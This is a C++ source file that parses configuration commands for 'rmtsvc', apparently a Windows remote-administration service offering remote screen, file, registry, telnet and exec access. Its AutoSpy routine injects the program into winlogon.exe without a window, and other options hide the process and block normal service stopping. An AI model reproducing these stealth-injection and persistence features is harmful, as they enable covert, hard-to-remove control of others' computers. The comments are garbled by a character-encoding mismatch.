/*******************************************************************
   *	parseCommand.cpp 
   *    DESCRIPTION:���������ļ��е���������
   *
   *    AUTHOR:yyc
   *
   *    http://hi.baidu.com/yycblog/home
   *
   *    DATE:2005-12-30
   *	
   *******************************************************************/

#include "rmtsvc.h"
#include "shellCommandEx.h"
#include "cInjectDll.h"

//*********************����ȫ���û��Զ���֤����� statrt ****************************************
std::string g_strMyCert="";
std::string g_strMyKey="";
std::string g_strKeyPswd="";
std::string g_strCaCert="";
std::string g_strCaCRL="";
//����ssl֤���CRL��Ϣ �����ʽ: 
//	ssls [mycert=<�û�SSL֤���ļ�>] [mykey=<�û�֤��˽Կ�ļ�>] [keypwd=<�û�˽Կ����>] [caroot=<CA��֤��>] [cacrl=<CA����֤���б�>]
//�˲���֧�ֵ�֤���ļ���ʽΪPEM��ʽ
void docmd_ssls(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	if( (it=maps.find("mycert"))!=maps.end()) 
		g_strMyCert=(*it).second;
	else g_strMyCert="";
	if( (it=maps.find("mykey"))!=maps.end()) 
		g_strMyKey=(*it).second;
	else g_strMyKey="";
	if( (it=maps.find("keypwd"))!=maps.end()) 
		g_strKeyPswd=(*it).second;
	else g_strKeyPswd="";
	if( (it=maps.find("caroot"))!=maps.end()) 
		g_strCaCert=(*it).second;
	else g_strCaCert="";
	if( (it=maps.find("cacrl"))!=maps.end()) 
		g_strCaCRL=(*it).second;
	else g_strCaCRL="";
	//yyc modify 2007-01-24
	if(g_strMyCert!="") getAbsolutfilepath(g_strMyCert);
	if(g_strMyKey!="") getAbsolutfilepath(g_strMyKey);
	if(g_strCaCert!="") getAbsolutfilepath(g_strCaCert);
	if(g_strCaCRL!="") getAbsolutfilepath(g_strCaCRL);
}
//*********************����ȫ���û��Զ���֤�����  end  ****************************************
//�����Զ�����
BOOL MyService::AutoSpy(const char *commandline)
{
	std::string strProcessname=(m_bDebug)?"explorer.exe":"winlogon.exe";
	cInjectDll inject(strProcessname.c_str());	
	DWORD dwret=inject.Inject(NULL);
	if(dwret)
	{
		DWORD dwCreationFlags=(m_bDebug)?0:CREATE_NO_WINDOW;
		dwret=inject.spySelf(m_hStop,dwCreationFlags,commandline);
		if(dwret==0) 
			RW_LOG_PRINT(LOGLEVEL_INFO,"Success to spy,injecting into %s.\r\n",strProcessname.c_str());
		else
			RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to inject into %s, Error Code=%d.\r\n",
										strProcessname.c_str(),(long)dwret);
		return (dwret==0)?TRUE:FALSE;
	}else
		RW_LOG_PRINT(LOGLEVEL_INFO,"Failed to open %s for Injection.\r\n",strProcessname.c_str());
	return FALSE;
}
//������ʱ���� at=hh:mm/[t|d]
bool MyService::CreateTaskTime(const char *ptrAt,const char *strTask)
{
	if(ptrAt==NULL || strTask==NULL) return false;

	TaskTimer task; task.h=task.m=task.flag=task.type=0;
	task.strTask.assign(cUtils::strTrim((char *)strTask)); 
	char c=0; //��ʱ��������
	if(strchr(ptrAt,':'))
		 ::sscanf(ptrAt,"%d:%d/%c",&task.h,&task.m,&c);
	else ::sscanf(ptrAt,"%d/%c",&task.h,&c);
	
	if(c=='d') //ÿ�춨ʱִ��
		task.type=c;
	else if(c=='t') //��ʱ���ִ��
		task.type=c;
	if(task.type==0) return false;
	RW_LOG_PRINT(LOGLEVEL_INFO,"TaskTimer: h=%d,m=%d,type=%c\r\n\t%s\r\n",
		task.h,task.m,c,task.strTask.c_str());
	m_tasklist.push_back(task); return true;
}

//ini�ļ�֧�ֵ�����
void MyService::parseCommand(const char *strCommand)
{
	if(strCommand==NULL || strCommand[0]==0) return;
	while(*strCommand==' ') strCommand++;
	char *ptrAt=(char *)strstr(strCommand," at=");
	if(ptrAt){//������Ϊ��ʱ����
		*ptrAt='\0';
		CreateTaskTime(ptrAt+4,strCommand);
		*ptrAt=' '; return;
	}//?if(ptrAt){//������Ϊ��ʱ����
	
	if(strncasecmp(strCommand,"iprules ",8)==0)
	{
		std::map<std::string,std::string> maps;
		if(splitString(strCommand+8,' ',maps)<=0) return;
		std::map<std::string,std::string>::iterator it=maps.find("type");
		if(it!=maps.end() && (*it).second=="webs") 
		{	m_websvr.docmd_webiprules(strCommand+8); return; }
		else if(it!=maps.end() && (*it).second=="telnet")
		{	m_telsvr.docmd_iprules(strCommand+8); return; }
		//������Ž�m_vidcManager.parseCommand(pstart);����
	}//?if(strncasecmp(strCommand,"iprules ",8)==0)

	if(strncasecmp(strCommand,"sets ",5)==0) //���ñ��������Ϣ
		this->docmd_sets(strCommand+5);
	else if(strncasecmp(strCommand,"ssls ",5)==0) //����ssl֤����Ϣ
		docmd_ssls(strCommand+5);
	else if(strncasecmp(strCommand,"telnet ",7)==0) //����telnet
		m_telsvr.docmd_sets(strCommand+7);
	else if(strncasecmp(strCommand,"webs ",5)==0) //���ñ�������Ϣ
		m_websvr.docmd_webs(strCommand+5);
	else if(strncasecmp(strCommand,"user ",5)==0)
		m_websvr.docmd_user(strCommand+5);
/*  //yyc remove MSN 2010-11-05
	else if(strncasecmp(strCommand,"msnbot ",7)==0)
		m_msnbot.docmd_msnbot(strCommand+7);
	else if(strncasecmp(strCommand,"proxy ",6)==0)
		m_msnbot.docmd_proxy(strCommand+6);
*/ //yyc remove MSN 2010-11-05
	else if(strncasecmp(strCommand,"kill ",5)==0) //ɱ��ָ���Ľ���
		::docmd_kill(strCommand+5);
	else if(strncasecmp(strCommand,"exec ",5)==0) //ִ��ָ���ĳ���
		::docmd_exec(strCommand+5);
	else if(strncasecmp(strCommand,"cmdpage ",8)==0)
		m_preCmdpage.assign(strCommand+8);
	//����m_vidcManager.parseCommand(pstart);����
	else m_vidcManager.parseCommand(strCommand);
}

//���ñ��������Ϣ
//�����ʽ: 
//	sets [log=<��־����ļ�>] [opentype=APPEND] [loglevel=DEBUG|INFO|WARN|ERROR]
//log=<��־����ļ�> : ���ó����Ƿ�������־�ļ��������ָ��������������ָ������־�ļ�
//opentype=APPEND    : ���ó�������ʱ�Ƿ�Ϊ׷��д��־�ļ����Ǹ���д,��������ô�����Ϊ����д
//loglevel=DEBUG|INFO|WARN|ERROR : ������־����ļ���Ĭ��ΪINFO����
//stop_pswd=<ֹͣ���������> : ����ֹͣ��������룬����������������������뽫�޷�ֹͣ����
//		��������������û�ֻ������������ͨ��-e <����> ����ֹͣ���񣬶��޷�ͨ��SCM�������̨��net stop����ֹͣ����
//		���������Ϊxx.exe,������ֹͣ����Ϊ123����Ҫֹͣ�˷�������������������xx.exe -e 123
//faceless=TRUE : ����ԷǷ���ʽ����������ʱû��ָ��-d���������޴��ڵ���ʽ���б�����
//		����˫��ֱ�����б�����ʱ����������˴��������޴��ڵ���ʽ���У���ʹ�رտ���̨���ڳ���Ҳ�������
//		�����Դ����ڵ���ʽ���а�Ctrl+c���߹رմ�������򽫽���
void MyService :: docmd_sets(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("opentype"))!=maps.end())
	{//������־�ļ�Ϊ׷��д�ķ�ʽ
		if((*it).second=="APPEND")
			RW_LOG_OPENFILE_APPEND();
	}
	if( (it=maps.find("log"))!=maps.end())
	{//������־�ļ�
		if((*it).second!="" && (*it).second!="null")
		{
			getAbsolutfilepath((*it).second);
			RW_LOG_SETFILE((long)(*it).second.c_str())
		}
	}
	if( (it=maps.find("loglevel"))!=maps.end())
	{//������־�������
		if((*it).second=="DEBUG")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_DEBUG)
		else if((*it).second=="INFO")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_INFO)
		else if((*it).second=="WARN")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_WARN)
		else if((*it).second=="ERROR")
			RW_LOG_SETLOGLEVEL(LOGLEVEL_ERROR)
	}

	if( (it=maps.find("spyself"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bSpyself=false;
	}
	if( (it=maps.find("stop_pswd"))!=maps.end())
	{
		if( (*it).second!="") CreateStopEvent((*it).second.c_str());
	} 
	if( (it=maps.find("faceless"))!=maps.end())
	{
		if( (*it).second=="TRUE" ) m_bFaceless=true;
	}
	if( (it=maps.find("install"))!=maps.end())
	{
		if( (*it).second=="TRUE") InstallService();
	}
}

//����web����������Ϣ
//�����ʽ: 
//	webs [port=<web����˿�>] [bindip=<������󶨵ı���IP>] [root=<��Ŀ¼>] [access=<����Ŀ¼�ķ���Ȩ��>] [default=<Ĭ���ĵ�>]
//port=<����˿�>    : ���÷���˿ڣ������������Ĭ��Ϊ7778.����Ϊ0������web���� <0���漴����˿�
//bindip=<������󶨵ı���IP> : ���ñ�����󶨵ı���IP�������������Ĭ�ϰ󶨱�������IP
//root=<��Ŀ¼>     : ָ����web����ĸ�/��Ӧ����Ŀ¼����Ŀ¼�����б����񱾵ػ���ʵ�ʾ���·��
//					�����Ŀ¼�а����ո���Ҫ��""����Ŀ¼����
//					�����Ŀ¼����""�����Ĭ�ϸ�Ŀ¼Ϊ�����������Ŀ¼
//access=<����Ŀ¼�ķ���Ȩ��> : ָ������Ŀ¼�ķ���Ȩ�ޡ�
//		�����������Ĭ�Ͼ���ACCESS_NONE����Ȩ�ޡ����ø�ʽ�ͺ�������
//		<����Ŀ¼�ķ���Ȩ��> : <FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST|DIR_NOINHERIT>
//		ACCESS_ALL=FILE_READ|FILE_WRITE|FILE_EXEC|DIR_LIST
//		FILE_READ : ��ȡ FILE_WRITE : д�� FILE_EXEC : ִ��
//		DIR_LIST : Ŀ¼���
//		DIR_NOINHERIT : �Ƿ��������Ŀ¼��Ӧ����ʵ·���µ���Ŀ¼�̳��û�ָ����Ŀ¼����Ȩ�ޡ�
//default=<Ĭ���ĵ�>
//resource=<FALSE> : ���ӳ�����Դ�л�ȡ�ļ�
void webServer :: docmd_webs(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("port"))!=maps.end())
	{//���÷���Ķ˿�
		m_svrport=atoi((*it).second.c_str());
	}
	if( (it=maps.find("bindip"))!=maps.end())
	{//���÷����IP
		m_bindip=(*it).second;
	}
	if( (it=maps.find("poweroff"))!=maps.end())
	{//�Ƿ�����Ȩ�޿�ֱ��Զ�̹ػ�������
		if((*it).second=="ANYONE") m_bPowerOff=true;
	}
	if( (it=maps.find("resource"))!=maps.end())
	{
		if((*it).second=="FALSE") m_bGetFileFromRes=false;
	}

	long lAccess=HTTP_ACCESS_NONE;
	std::string rootpath,defaultPage;
	if( (it=maps.find("root"))!=maps.end())
		rootpath=(*it).second;
	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"FILE_READ")) lAccess|=HTTP_ACCESS_READ;
		if(strstr(ptr,"FILE_WRITE")) lAccess|=HTTP_ACCESS_WRITE;
		if(strstr(ptr,"FILE_EXEC")) lAccess|=HTTP_ACCESS_EXEC;
		if(strstr(ptr,"DIR_LIST")) lAccess|=HTTP_ACCESS_LIST;
		if(strstr(ptr,"DIR_NOINHERIT")) lAccess|=HTTP_ACCESS_SUBDIR_INHERIT;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=HTTP_ACCESS_ALL;
	}
	if(!m_bGetFileFromRes) //���ָ������exe��Դ�л�ȡwebҳ�棬��ô������Ҫֻ��Ȩ��
			lAccess|=HTTP_ACCESS_READ;

	if( (it=maps.find("default"))!=maps.end())
		defaultPage=(*it).second;
	this->setRoot(rootpath.c_str(),lAccess,defaultPage.c_str());
	
	//web�����SSL֧�����ò���
	if( (it=maps.find("ssl_enabled"))!=maps.end() && (*it).second=="true")
		m_bSSLenabled=true;
	else m_bSSLenabled=false;
	if( (it=maps.find("ssl_verify"))!=maps.end() && (*it).second=="true")
		m_bSSLverify=true;
	else m_bSSLverify=false;
	
	return;
}

//����web�����ip���˹�������ĳ���ʺŵ�IP���˹���
//�����ʽ:
//	webiprules [access=0|1] ipaddr="<IP>,<IP>,..."
//access=0|1     : �Է�������IP�������Ǿܾ����Ƿ���
//����:
// webiprules access=0 ipaddr="192.168.0.*,192.168.1.10"
void webServer :: docmd_webiprules(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;

	int ipaccess=1;
	if( (it=maps.find("access"))!=maps.end())
		ipaccess=atoi((*it).second.c_str());
	
	if( (it=maps.find("ipaddr"))!=maps.end())
	{
		std::string ipRules=(*it).second;
		this->rules().addRules_new(RULETYPE_TCP,ipaccess,ipRules.c_str());
	}else this->rules().addRules_new(RULETYPE_TCP,ipaccess,NULL);

	return;
}

//���÷������ʺ�Ȩ����Ϣ
//�����ʽ��
//	user account=<�ʺ�> [pswd=<�ʺ�����>] [acess=<�ʺŵķ���Ȩ��>]
//account=<�����ʺ�> : ������. Ҫ��ӵ�rmtsvc�������ʺš�
//pswd=<�ʺ�����>    : ������. ָ���ʺŵ�����
//access=<�ʺŵķ���Ȩ��>
//	�����������Ĭ�Ͼ���ACCESS_NONE����Ȩ�ޡ����ø�ʽ�ͺ�������
//		ACCESS_ALL=ACCESS_SCREEN_ALL|ACCESS_FILE_ALL|ACCESS_REGIST_ALL|ACCESS_SERVICE_ALL|ACCESS_TELNET_ALL;
//		ACCESS_SCREEN_ALL: Զ����Ļ��ȫ����Ȩ��
//		ACCESS_SCREEN_VIEW: Զ�̲鿴��ĻȨ��
//		ACCESS_FILE_ALL  : Զ���ļ�����������ɶ�дɾ����
//		ACCESS_FILE_VIEW : Զ���ļ�������������������
//		ACCESS_REGIST_ALL: Զ��ע������ɶ�д���ɾ����
//		ACCESS_REGIST_VIEW:�����ɲ鿴ע�����Ϣ
//		ACCESS_SERVICE_ALL:Զ�̷����������ȫ����
//		ACCESS_SERVICE_VIEW:Զ�̷���Ȩ�������ɲ鿴
//		ACCESS_TELNET_ALL:  Զ��telnet����
//		ACCESS_FTP_ADMIN : Զ��FTP�������ù���
void webServer :: docmd_user(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return;
	std::map<std::string,std::string>::iterator it;
	
	std::string user,pswd;
	long lAccess=RMTSVC_ACCESS_NONE;
	if( (it=maps.find("account"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( (it=maps.find("access"))!=maps.end())
	{
		const char *ptr=(*it).second.c_str();
		if(strstr(ptr,"ACCESS_SCREEN_VIEW")) lAccess|=RMTSVC_ACCESS_SCREEN_VIEW;
		if(strstr(ptr,"ACCESS_SCREEN_ALL")) lAccess|=RMTSVC_ACCESS_SCREEN_ALL;
		if(strstr(ptr,"ACCESS_REGIST_VIEW")) lAccess|=RMTSVC_ACCESS_REGIST_VIEW;
		if(strstr(ptr,"ACCESS_REGIST_ALL")) lAccess|=RMTSVC_ACCESS_REGIST_ALL;
		if(strstr(ptr,"ACCESS_SERVICE_VIEW")) lAccess|=RMTSVC_ACCESS_SERVICE_VIEW;
		if(strstr(ptr,"ACCESS_SERVICE_ALL")) lAccess|=RMTSVC_ACCESS_SERVICE_ALL;
		if(strstr(ptr,"ACCESS_TELNET_VIEW")) lAccess|=RMTSVC_ACCESS_TELNET_VIEW;
		if(strstr(ptr,"ACCESS_TELNET_ALL")) lAccess|=RMTSVC_ACCESS_TELNET_ALL;
		if(strstr(ptr,"ACCESS_FILE_VIEW")) lAccess|=RMTSVC_ACCESS_FILE_VIEW;
		if(strstr(ptr,"ACCESS_FILE_ALL")) lAccess|=RMTSVC_ACCESS_FILE_ALL;
		if(strstr(ptr,"ACCESS_FTP_ADMIN")) lAccess|=RMTSVC_ACCESS_FTP_ADMIN;
		if(strstr(ptr,"ACCESS_VIDC_ADMIN")) lAccess|=RMTSVC_ACCESS_VIDC_ADMIN;
		if(strstr(ptr,"ACCESS_ALL")) lAccess=RMTSVC_ACCESS_ALL;
	}
	if(user!="" && lAccess!=RMTSVC_ACCESS_NONE)
	{
		::_strlwr((char *)user.c_str());
		std::pair<std::string,long> p(pswd,lAccess);
		m_mapUsers[user]=p;
	}
	m_bAnonymous=false; //����������˺���������������
}
/* //yyc remove MSN 2010-11-05
//����msn�����������Ϣ
//�����ʽ:
//	msnbot account=<msn�ʺ�>:<����> [trusted=<�����ε�msn�ʺ�>] [prefix="<�ƶ�MSN������Ϣǰ׺>"]
//account=<msn�ʺ�>:<����> : ָ��msn�����˵ĵ�¼�ʺź�����.
//trusted=<�����ε�msn�ʺ�>: ָ��msn���������ε�msn�ʺţ�
//			  ���ʺź�msn�����������������������Ʒ�������
//			  ���������ʺţ���','�ָ�
//prefix="<�ƶ�MSN������Ϣǰ׺>"
BOOL msnShell :: docmd_msnbot(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	std::map<std::string,std::string>::iterator it;

	if( (it=maps.find("account"))!=maps.end())
	{//��ʽ ��account:password
		this->setMsnAccount((*it).second.c_str());
		const char *ptr=strchr((*it).second.c_str(),':');
		if(ptr)
		{
			MyService *ptrService=MyService::GetService();
			webServer *pwwwSvc=&ptrService->m_websvr;//ָ��www�����ָ��
			*(char *)ptr=0; ptr++; char s[128]; 
			sprintf(s,"account=%s pswd=%s access=ACCESS_ALL",(*it).second.c_str(),ptr);
			pwwwSvc->docmd_user(s);
		}
	}
	if( (it=maps.find("trusted"))!=maps.end())
	{
		this->m_strTrusted=(*it).second;
		::_strlwr((char *)this->m_strTrusted.c_str());
	}
	if( (it=maps.find("prefix"))!=maps.end())
	{
		this->m_prefix==(*it).second;
	}else this->m_prefix="�Է�����ʹ���ֻ�MSN,���http://mobile.msn.com.cn��";
		            
	return TRUE;
}

//����msn�����˵Ĵ�����Ϣ
//�����ʽ: 
//	proxy type=HTTPS|SOCKS4|SOCKS5 host=<��������ַ> port=<�������˿�> [user=<���ʴ�������ʺ�>] [pswd=<���ʴ����������>]
BOOL msnShell :: docmd_proxy(const char *strParam)
{
	std::map<std::string,std::string> maps;
	if(splitString(strParam,' ',maps)<=0) return FALSE;
	PROXYTYPE ptype=PROXY_NONE;
	int proxyport=0;
	std::string host,user,pswd;
	std::map<std::string,std::string>::iterator it;
	if( (it=maps.find("type"))!=maps.end())
	{
		if((*it).second=="HTTPS")
			ptype=PROXY_HTTPS;
		else if((*it).second=="SOCKS4")
			ptype=PROXY_SOCKS4;
		else if((*it).second=="SOCKS5")
			ptype=PROXY_SOCKS5;
	}
	if( (it=maps.find("port"))!=maps.end())
		proxyport=atoi((*it).second.c_str());
	
	if( (it=maps.find("host"))!=maps.end())
		host=(*it).second;
	if( (it=maps.find("user"))!=maps.end())
		user=(*it).second;
	if( (it=maps.find("pswd"))!=maps.end())
		pswd=(*it).second;

	if( m_curAccount.m_chatSock.setProxy(ptype,host.c_str(),
		proxyport,user.c_str(),pswd.c_str()) )
		return TRUE;
	return FALSE;
}
*/ //yyc remove MSN 2010-11-05
//------------------------------------private function----------------------
int splitString(const char *str,char delm,std::map<std::string,std::string> &maps)
{
//	printf("split String - %s\r\n",str);
	if(str==NULL) return 0;
	while(*str==' ') str++;//ɾ��ǰ���ո�
	const char *ptr,*ptrStart,*ptrEnd;
	while( (ptr=strchr(str,'=')) )
	{
		char dm=delm; ptrStart=ptr+1;
		if(*ptrStart=='"') {dm='"'; ptrStart++; }
		ptrEnd=ptrStart;
		while(*ptrEnd && *ptrEnd!=dm) ptrEnd++;

		*(char *)ptr=0;
		::_strlwr((char *)str);
		maps[str]=std::string(ptrStart,ptrEnd-ptrStart);
		*(char *)ptr='=';

		if(*ptrEnd==0) break;
		str=ptrEnd+1;
		while(*str==' ') str++;//ɾ��ǰ���ո�
	}//?while(ptr)
	
//	std::map<std::string,std::string>::iterator it=maps.begin();
//	for(;it!=maps.end();it++)
//		printf("\t %s - %s.\r\n",(*it).first.c_str(),(*it).second.c_str());

	return maps.size();
}

int splitString(const char *str,char delm,std::vector<std::string> &vec,int maxSplit)
{
	if(str==NULL) return 0;
	while(*str==' ') str++;//ɾ��ǰ���ո�
	const char *ptr=strchr(str,delm);
	while(true)
	{
		if(maxSplit>0 && vec.size()>=maxSplit)
		{
			vec.push_back(str); break;
		}
		if(ptr) *(char *)ptr=0;
		vec.push_back(str);
		if(ptr==NULL) break;
		*(char *)ptr=delm; str=ptr+1;
		while(*str==' ') str++;//ɾ��ǰ���ո�
		ptr=strchr(str,delm);
	}//?while
	return vec.size();
}
